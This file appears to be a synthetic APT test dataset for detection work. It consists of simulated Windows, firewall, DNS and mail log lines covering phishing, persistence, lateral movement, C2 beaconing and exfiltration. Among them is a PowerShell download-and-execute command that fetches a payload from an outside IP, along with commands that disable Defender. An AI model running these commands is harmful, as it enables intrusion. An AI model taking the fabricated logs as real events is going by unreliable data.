@@ -1,0 +1,554 @@
+# ============================================================
+# APT (Advanced Persistent Threat) 测试数据集
+# 生成时间: 2024-12-20
+# 包含: 钓鱼邮件、持久化、提权、横向移动、数据窃取、C2通信
+# MITRE ATT&CK 对齐
+# ============================================================
+2024-12-20 16:50:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-21 14:00:00 192.168.1.200[Firewall]: OUTBOUND ICMP Type=8 Code=0 from 192.168.1.50 to 185.220.101.46 (Payload size: 1400 bytes, repeated 5000+ times)
+2024-12-20 10:00:00 10.0.0.55[Firewall]: OUTBOUND ICMP Type=8 Code=0 from 192.168.1.50 to 185.220.101.46 (Payload size: 1400 bytes, repeated 5000+ times)
+2024-12-20 16:00:00 192.168.1.100[Security]: EventID=4688 New process created with elevated token: Parent: cmd.exe, Child: powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://45.154.255.147/payload.ps1'))"
+2024-12-20 15:30:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Subject: Resume - 11 Application, Attachment: malicious_11.exe
+2024-12-21 00:30:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_29.exe"
+2024-12-20 17:00:00 172.16.0.100[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=192.168.1.100, AccountName=Administrator
+2024-12-20 13:00:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-21 19:00:00 WIN-DC-01[Security]: EventID=4662 An operation was performed on an object: ObjectType=User, Operation=GetChanges, CallerPS=DC01$
+2024-12-21 06:00:00 192.168.1.100[DNS]: Query:很长的主机名模式.subdomain.apt-c2.com -> 185.220.101.46
+2024-12-20 23:30:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 23:00:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_26.exe"
+2024-12-21 06:00:00 192.168.1.100[Firewall]: OUTBOUND BLOCK TCP 192.168.1.100:52345 -> 185.220.101.46:443 (Data: 2.5GB)
+2024-12-20 16:00:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 10:45:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 22:00:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Subject: Resume - 24 Application, Attachment: malicious_24.exe
+2024-12-21 22:00:00 172.16.0.100[DNS]: Query:很长的主机名模式.subdomain.apt-c2.com -> 185.220.101.46
+2024-12-21 01:00:00 WIN-DC-01[Security]: EventID=4688 New process created: CommandLine="C:\Windows\System32\lsass.exe" (but actually procspawn)
+2024-12-20 13:30:00 WIN-SQL-01[Network]: CONNECT http://45.154.255.147:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 03:00:00 192.168.1.50[Security]: EventID=4688 PsExec.exe -s -d \192.168.1.200 cmd.exe
+2024-12-20 13:45:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 21:00:00 192.168.1.50[Security]: EventID=4688 PsExec.exe -s -d \172.16.0.100 cmd.exe
+2024-12-21 18:00:00 192.168.1.50[Azure]: Upload: Container=company-backup, Files=5000+, Size=500MB, Destination=https://company-backup.s3.amazonaws.com/backup
+2024-12-21 02:00:00 WIN-WEB-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 23:00:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Subject: Quarterly Report - Q4 2024, Attachment: malicious_26.exe
+2024-12-20 16:00:00 10.0.0.55[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=172.16.0.100, AccountName=Administrator
+2024-12-21 05:00:00 10.0.0.55[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=192.168.1.100, AccountName=Administrator
+2024-12-20 16:40:00 WIN-APP-01[Network]: CONNECT http://103.35.74.12:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 18:15:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-21 02:00:00 192.168.1.200[Azure]: Upload: Container=company-backup, Files=5000+, Size=500MB, Destination=https://company-backup.s3.amazonaws.com/backup
+2024-12-20 11:40:00 WIN-APP-01[Network]: CONNECT http://185.220.101.46:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 07:00:00 WIN-DC-01[Security]: EventID=4662 An operation was performed on an object: ObjectType=User, Operation=GetChanges, CallerPS=DC01$
+2024-12-20 12:00:00 WIN-WEB-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 10:20:00 WIN-SQL-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-21 04:00:00 10.0.0.55[Security]: EventID=4673 A privileged service was called: Subject: Security ID=S-1-5-21-xxx-500, Process Name=C:\Windows\System32\Updater.exe
+2024-12-20 14:30:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-21 14:00:00 192.168.1.200[Azure]: Upload: Container=company-backup, Files=5000+, Size=500MB, Destination=https://company-backup.s3.amazonaws.com/backup
+2024-12-20 17:20:00 WIN-APP-01[Network]: CONNECT http://103.35.74.12:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 11:10:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-21 04:00:00 192.168.1.200[Security]: EventID=4688 PsExec.exe -s -d \192.168.1.100 cmd.exe
+2024-12-20 23:00:00 WIN-SQL-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-21 19:00:00 WIN-DC-01[Security]: EventID=4649 A replay attack was detected - potential pass-the-hash
+2024-12-21 03:15:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 16:00:00 WIN-SQL-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-21 06:00:00 192.168.1.50[Security]: EventID=4673 A privileged service was called: Subject: Security ID=S-1-5-21-xxx-500, Process Name=C:\Windows\System32\Updater.exe
+2024-12-20 16:00:00 WIN-WEB-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-20 14:00:00 WIN-SQL-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-21 14:00:00 192.168.1.100[Security]: EventID=4673 A privileged service was called: Subject: Security ID=S-1-5-21-xxx-500, Process Name=C:\Windows\System32\Updater.exe
+2024-12-21 02:30:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-21 01:45:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 11:00:00 192.168.1.200[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=192.168.1.200, AccountName=Administrator
+2024-12-20 22:45:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 17:00:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_14.exe"
+2024-12-20 21:00:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_22.exe"
+2024-12-20 14:00:00 192.168.1.100[Security]: EventID=4688 Process Create: CommandLine=wmic /node:172.16.0.100 process call create "powershell.exe -c ..."
+2024-12-20 14:30:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 16:30:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 10:00:00 10.0.0.55[Firewall]: OUTBOUND BLOCK TCP 192.168.1.100:52345 -> 185.220.101.46:443 (Data: 2.5GB)
+2024-12-21 01:45:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 20:30:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 13:40:00 WIN-WEB-01[Network]: CONNECT http://103.35.74.12:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 14:00:00 192.168.1.100[Azure]: Upload: Container=company-backup, Files=5000+, Size=500MB, Destination=https://company-backup.s3.amazonaws.com/backup
+2024-12-20 15:30:00 WIN-SQL-01[Network]: CONNECT http://45.154.255.147:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 17:00:00 192.168.1.100[Security]: EventID=4688 Process Create: CommandLine=wmic /node:172.16.0.100 process call create "powershell.exe -c ..."
+2024-12-20 18:00:00 192.168.1.200[Security]: EventID=4673 A privileged service was called: Subject: Security ID=S-1-5-21-xxx-500, Process Name=C:\Windows\System32\Updater.exe
+2024-12-21 04:00:00 192.168.1.200[Security]: EventID=4688 Process Create: CommandLine=wmic /node:192.168.1.100 process call create "powershell.exe -c ..."
+2024-12-21 01:00:00 172.16.0.100[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=192.168.1.50, AccountName=Administrator
+2024-12-20 14:00:00 172.16.0.100[Security]: EventID=4673 A privileged service was called: Subject: Security ID=S-1-5-21-xxx-500, Process Name=C:\Windows\System32\Updater.exe
+2024-12-21 02:30:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 22:00:00 WIN-WEB-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-20 12:00:00 WIN-WEB-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-20 19:00:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Attachment: resume_18.pdf.exe, Attachment: malicious_18.exe
+2024-12-20 19:00:00 WIN-DC-01[Security]: EventID=4649 A replay attack was detected - potential pass-the-hash
+2024-12-20 19:00:00 WIN-APP-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-20 16:00:00 WIN-DC-01[Security]: EventID=4649 A replay attack was detected - potential pass-the-hash
+2024-12-20 16:50:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 11:50:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 12:40:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 14:00:00 WIN-SQL-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 22:00:00 192.168.1.200[Firewall]: OUTBOUND BLOCK TCP 192.168.1.100:52345 -> 185.220.101.46:443 (Data: 2.5GB)
+2024-12-20 22:45:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 17:10:00 WIN-WEB-01[Network]: CONNECT http://23.129.64.213:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 16:00:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_12.exe"
+2024-12-20 12:30:00 WIN-WEB-01[Network]: CONNECT http://103.35.74.12:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 18:00:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_16.exe"
+2024-12-20 11:50:00 WIN-APP-01[Network]: CONNECT http://185.220.101.46:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 00:00:00 192.168.1.200[Security]: EventID=4688 Process Create: CommandLine=wmic /node:172.16.0.100 process call create "powershell.exe -c ..."
+2024-12-21 02:00:00 192.168.1.200[Firewall]: OUTBOUND BLOCK TCP 192.168.1.100:52345 -> 185.220.101.46:443 (Data: 2.5GB)
+2024-12-20 22:45:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-21 05:00:00 WIN-WEB-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-20 14:40:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 14:40:00 WIN-WEB-01[Network]: CONNECT http://185.220.101.46:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 19:00:00 WIN-DC-01[Security]: EventID=4674 SeDebugPrivilege assigned to user: Administrator
+2024-12-20 15:10:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-21 00:15:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 22:00:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_24.exe"
+2024-12-20 16:50:00 WIN-WEB-01[Network]: CONNECT http://103.35.74.12:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 19:00:00 192.168.1.100[Security]: EventID=4688 PsExec.exe -s -d \192.168.1.100 cmd.exe
+2024-12-21 03:15:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 13:20:00 WIN-WEB-01[Network]: CONNECT http://185.220.101.46:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 22:00:00 172.16.0.100[Security]: EventID=4688 Process Create: CommandLine=wmic /node:192.168.1.200 process call create "powershell.exe -c ..."
+2024-12-20 14:50:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 21:00:00 192.168.1.50[Security]: EventID=4688 Process Create: CommandLine=wmic /node:172.16.0.100 process call create "powershell.exe -c ..."
+2024-12-20 11:00:00 WIN-WEB-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-20 11:30:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 17:10:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 17:00:00 WIN-APP-01[Network]: CONNECT http://91.121.87.18:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 14:00:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Attachment: resume_8.pdf.exe, Attachment: malicious_8.exe
+2024-12-20 19:30:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Subject: Invoice #19 - Payment Required, Attachment: malicious_19.exe
+2024-12-20 17:30:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_15.exe"
+2024-12-21 00:00:00 WIN-WEB-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-20 16:45:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 14:30:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 18:00:00 10.0.0.55[Security]: EventID=4688 Process Create: CommandLine=wmic /node:172.16.0.100 process call create "powershell.exe -c ..."
+2024-12-20 11:30:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 16:45:00 WIN-WEB-01[PowerShell]: CommandLine: powershell -enc SQBFAFgAIAAoAE4AZQB3AC0A..(base64 encoded payload)
+2024-12-20 17:30:00 WIN-APP-01[Network]: CONNECT http://185.220.101.46:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 02:30:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 10:00:00 WIN-APP-01[Network]: CONNECT http://45.154.255.147:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 01:00:00 WIN-SQL-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-21 03:00:00 WIN-SQL-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-20 17:20:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 10:00:00 192.168.1.50[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=172.16.0.100, AccountName=Administrator
+2024-12-20 10:50:00 WIN-WEB-01[Network]: CONNECT http://185.220.101.46:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 00:15:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 22:00:00 172.16.0.100[Security]: EventID=4688 PsExec.exe -s -d \192.168.1.200 cmd.exe
+2024-12-21 19:00:00 WIN-DC-01[Security]: EventID=4688 New process created: CommandLine="C:\Windows\System32\lsass.exe" (but actually procspawn)
+2024-12-20 14:00:00 WIN-APP-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 18:00:00 10.0.0.55[DNS]: Query:很长的主机名模式.subdomain.apt-c2.com -> 185.220.101.46
+2024-12-20 10:00:00 WIN-DC-01[Security]: EventID=4674 SeDebugPrivilege assigned to user: Administrator
+2024-12-20 15:30:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_11.exe"
+2024-12-20 13:45:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 17:40:00 WIN-SQL-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 16:45:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 12:00:00 192.168.1.50[Security]: EventID=4673 A privileged service was called: Subject: Security ID=S-1-5-21-xxx-500, Process Name=C:\Windows\System32\Updater.exe
+2024-12-21 01:00:00 WIN-DC-01[Security]: EventID=4662 An operation was performed on an object: ObjectType=User, Operation=GetChanges, CallerPS=DC01$
+2024-12-20 12:50:00 WIN-SQL-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-21 02:00:00 192.168.1.200[Security]: EventID=4688 Process Create: CommandLine=wmic /node:172.16.0.100 process call create "powershell.exe -c ..."
+2024-12-20 13:00:00 WIN-SQL-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 22:00:00 192.168.1.200[Azure]: Upload: Container=company-backup, Files=5000+, Size=500MB, Destination=https://company-backup.s3.amazonaws.com/backup
+2024-12-21 04:00:00 WIN-WEB-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-20 17:40:00 WIN-SQL-01[Network]: CONNECT http://185.220.101.46:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 04:00:00 192.168.1.100[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=192.168.1.200, AccountName=Administrator
+2024-12-20 18:10:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 10:40:00 WIN-APP-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 10:00:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_0.exe"
+2024-12-20 22:30:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_25.exe"
+2024-12-20 14:50:00 WIN-WEB-01[Network]: CONNECT http://45.154.255.147:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 17:30:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 17:50:00 WIN-SQL-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 19:00:00 WIN-APP-01[System]: Task Scheduler: Created task "WindowsUpdater" with trigger: At log on, Action: "C:\Windows\System32\Updater.exe"
+2024-12-20 17:20:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 23:30:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 14:30:00 WIN-WEB-01[Network]: CONNECT http://23.129.64.213:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 22:00:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-21 01:00:00 192.168.1.50[Security]: EventID=4688 Process Create: CommandLine=wmic /node:172.16.0.100 process call create "powershell.exe -c ..."
+2024-12-20 14:10:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 10:00:00 WIN-DC-01[Security]: EventID=4688 New process created: CommandLine="C:\Windows\System32\lsass.exe" (but actually procspawn)
+2024-12-21 04:00:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-21 18:00:00 192.168.1.50[DNS]: Query:很长的主机名模式.subdomain.apt-c2.com -> 185.220.101.46
+2024-12-20 16:45:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-21 03:00:00 192.168.1.50[Security]: EventID=4688 Process Create: CommandLine=wmic /node:192.168.1.200 process call create "powershell.exe -c ..."
+2024-12-20 18:30:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Subject: Invoice #17 - Payment Required, Attachment: malicious_17.exe
+2024-12-21 02:30:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 10:00:00 10.0.0.55[Security]: EventID=4673 A privileged service was called: Subject: Security ID=S-1-5-21-xxx-500, Process Name=C:\Windows\System32\Updater.exe
+2024-12-20 14:10:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-20 14:00:00 172.16.0.100[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=192.168.1.100, AccountName=Administrator
+2024-12-21 18:00:00 192.168.1.50[Firewall]: OUTBOUND BLOCK TCP 192.168.1.100:52345 -> 185.220.101.46:443 (Data: 2.5GB)
+2024-12-20 17:00:00 WIN-APP-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-21 02:00:00 192.168.1.200[Firewall]: OUTBOUND ICMP Type=8 Code=0 from 192.168.1.50 to 185.220.101.46 (Payload size: 1400 bytes, repeated 5000+ times)
+2024-12-20 22:00:00 WIN-DC-01[Security]: EventID=4662 An operation was performed on an object: ObjectType=User, Operation=GetChanges, CallerPS=DC01$
+2024-12-20 10:00:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-21 01:00:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-20 16:30:00 WIN-APP-01[Network]: CONNECT http://185.220.101.46:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-21 07:00:00 WIN-DC-01[Security]: EventID=4688 New process created: CommandLine="C:\Windows\System32\lsass.exe" (but actually procspawn)
+2024-12-20 14:30:00 WIN-2019-DC[Security]: EventID=4688 A new process has been created: CommandLine: "C:\Users\victim\Downloads\malicious_9.exe"
+2024-12-20 10:20:00 WIN-SQL-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 17:30:00 WIN-WEB-01[Security]: EventID=1102 The security event log was cleared: User=Administrator
+2024-12-21 02:00:00 WIN-WEB-01[System]: Service Control Manager: New service installed: DisplayName="System Update Service", ImagePath="C:\Program Files\Updater\service.exe"
+2024-12-20 14:30:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-21 00:00:00 172.16.0.100[Security]: EventID=4624 Successful logon: LogonType=10, SourceNetworkAddress=192.168.1.200, AccountName=Administrator
+2024-12-20 12:10:00 WIN-SQL-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 11:10:00 WIN-WEB-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-21 01:00:00 WIN-DC-01[Security]: EventID=4674 SeDebugPrivilege assigned to user: Administrator
+2024-12-20 15:50:00 WIN-SQL-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-21 01:00:00 WIN-WEB-01[System]: Service Stopped: Windows Defender Antivirus Service
+2024-12-20 12:00:00 192.168.1.50[Security]: EventID=4688 Process Create: CommandLine=wmic /node:192.168.1.50 process call create "powershell.exe -c ..."
+2024-12-20 13:00:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 12:10:00 WIN-SQL-01[Network]: CONNECT http://91.121.87.18:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 10:50:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-21 10:00:00 WIN-DC-01[Security]: EventID=4662 An operation was performed on an object: ObjectType=User, Operation=GetChanges, CallerPS=DC01$
+2024-12-20 21:15:00 WIN-WEB-01[Security]: EventID=4657 Registry value modified: HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware=1
+2024-12-20 13:00:00 WIN-SQL-01[Security]: EventID=4657 A registry value was modified: ObjectName=HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\Updater.exe, NewValue="C:\Users\admin\Updater.exe"
+2024-12-21 01:00:00 192.168.1.50[Security]: EventID=4688 PsExec.exe -s -d \172.16.0.100 cmd.exe
+2024-12-20 12:20:00 WIN-WEB-01[Firewall]: OUTBOUND TLS 192.168.1.100:52431 -> 45.154.255.147:443 (SNI: api.google.com)
+2024-12-21 10:00:00 WIN-DC-01[Security]: EventID=4649 A replay attack was detected - potential pass-the-hash
+2024-12-20 10:00:00 10.0.0.55[Azure]: Upload: Container=company-backup, Files=5000+, Size=500MB, Destination=https://company-backup.s3.amazonaws.com/backup
+2024-12-21 00:30:00 mail-server[info]: From: "ACME Corp" <hr@acme-malicious.com>, To: victim@company.com, Subject: Attachment: invoice_29.doc.exe, Attachment: malicious_29.exe
+2024-12-20 15:30:00 WIN-SQL-01[DNS]: Query: random-domain-20241220.ddns.net -> 103.35.74.12
+2024-12-20 12:50:00 WIN-SQL-01[Network]: CONNECT http://103.35.74.12:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
+2024-12-20 15:20:00 WIN-SQL-01[Network]: CONNECT http://185.220.101.46:443/api/update.php HTTP/1.1 (Beacon interval: 60s, Jitter: 10%)
